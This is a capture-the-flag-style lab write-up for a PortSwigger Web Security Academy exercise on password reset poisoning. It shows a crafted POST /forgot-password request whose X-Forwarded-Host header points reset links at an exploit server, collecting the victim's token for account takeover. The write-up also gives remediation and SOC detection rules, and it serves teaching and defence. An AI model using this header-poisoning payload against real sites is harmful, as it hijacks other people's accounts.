# Password Reset Poisoning via Middleware

| Field | Detail |
|---|---|
| Lab | Password reset poisoning via middleware |
| Platform | PortSwigger Web Security Academy |
| Vulnerability | Password reset poisoning via X-Forwarded-Host header |
| CWE | CWE-640: Weak Password Recovery Mechanism for Forgotten Password |
| Severity | High |
| Date | 15 November 2026 |
| Author | Md Jahidur Rahman Jahid |

## Summary

When a user asks for a password reset, the application emails them
a link containing a secret token. The link is built using the
`X-Forwarded-Host` header — a header the middleware trusts without
checking. An attacker can set that header to their own server, so
the reset link in the victim's email points to the attacker's
server instead of the real site. When the victim clicks it, their
browser sends the secret token to the attacker, who then uses it on
the real site to set a new password.

## Steps to Reproduce

1. Understand the normal reset flow. Click "Forgot password",
   enter your own username (`wiener`), and submit the form while
   intercepting in Burp Suite. Check the email client: the reset
   link looks like this:

```
https://<lab-id>.web-security-academy.net/forgot-password?temp-forgot-password-token=<token>
```

2. Test which header builds the link. Changing the `Host` header
   directly is blocked (`403 Forbidden`) — the application
   validates it. But the `X-Forwarded-Host` header is trusted by
   the middleware without any check.
3. Poison the reset for the victim. Send the forgot-password
   request for `carlos` with the `X-Forwarded-Host` header pointing
   to your exploit server:

```http
POST /forgot-password HTTP/1.1
Host: <lab-id>.web-security-academy.net
X-Forwarded-Host: <exploit-server-id>.exploit-server.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&username=carlos
```

   The server answers `200 OK`: "Please check your email for a
   password reset link."
4. Collect the token. Carlos clicks any link in his emails. Open
   the exploit server's access log: his browser requested the
   poisoned link, and the full URL — including his reset token —
   is in the log:

```
GET /forgot-password?temp-forgot-password-token=<carlos's token>
```

   (The token itself is never published — it is a live secret for
   the account.)
5. Use the token on the real site. Open the reset URL on the lab
   domain with carlos's token, set a new password, and submit. The
   server answers with a `302` redirect.
6. Log in as `carlos` with the new password to solve the lab.

## Evidence

[Screenshot: the normal reset email for wiener, showing the reset
link format — to be added]

[Screenshot: the poisoned POST /forgot-password request for carlos
with the X-Forwarded-Host header — to be added]

[Screenshot: the exploit server access log showing carlos's token
arriving — to be added]

[Screenshot: the password reset form on the real site, and the
login as carlos with the new password — to be added]

## Impact

An attacker who can poison a password reset can:

- Take over any account, including an administrator's, without
  knowing the password and without touching the victim's email.
- Do it with a single request — the victim does the rest by
  clicking a link that looks like it came from the real site.
- Repeat the attack for every user, since the header is trusted
  for all reset emails.

The victim did nothing wrong: they asked for a reset and clicked
the link the site sent them. The site itself handed the token to
the attacker.

## Remediation

- Never build reset links (or any security-sensitive URL) from a
  request header. Use a fixed base URL from the server
  configuration.
- If `X-Forwarded-Host` must be read at all, accept it only from
  known, trusted proxies, and validate it against an allowlist of
  your own domains.
- Bind reset tokens to the account and expire them quickly, and
  invalidate the token as soon as it is used.
- Consider requiring the user to confirm the reset (for example,
  entering a code from the email) instead of trusting a bare link.

## Detection (SOC)

- Alert on forgot-password requests carrying an
  `X-Forwarded-Host` header, especially one pointing outside your
  own domains.
- Alert on password resets where the token is redeemed from a
  different IP or session than the one that requested it.
- Alert on a burst of forgot-password requests for many different
  usernames from one source.

## References

- PortSwigger — Password reset poisoning via middleware: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
- PortSwigger — Password reset poisoning: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
- CWE-640: https://cwe.mitre.org/data/definitions/640.html
